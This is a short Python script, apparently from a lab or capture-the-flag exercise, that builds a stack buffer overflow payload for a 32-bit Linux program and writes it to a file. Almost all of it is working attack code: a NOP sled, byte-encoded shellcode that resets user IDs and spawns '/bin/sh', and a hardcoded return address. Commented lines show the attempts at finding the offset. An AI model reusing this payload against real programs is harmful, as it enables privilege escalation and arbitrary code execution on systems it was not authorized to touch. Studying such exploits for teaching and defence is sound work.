from cgitb import reset
from unittest import result


args = "a a" 
padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppTTTT"
hexString = "0x20fcffbf"[2:]
#stackAdr = hexString.decode("hex")
#stackAdr = "\xbf\xff\xfb\x8d"
stackAdr = "\x9c\xfa\xff\xbf"
#nop = "\x90"*20

shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')

#result = padding + "TTTTBBBBAAAAYYYYNNNNFFFFLLLLOOOO" + " " + args

#result = padding + stackAdr + nop + shellcode + " " + args 

result = args + " " + "\x90"*181 + shellcode + stackAdr #"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

#result = args + " " + "a"*(75+181) + "TTTT"

print(len(padding)-len(result))
print(result)
text_file = open("alph", "w")
text_file.write(result)
text_file.close()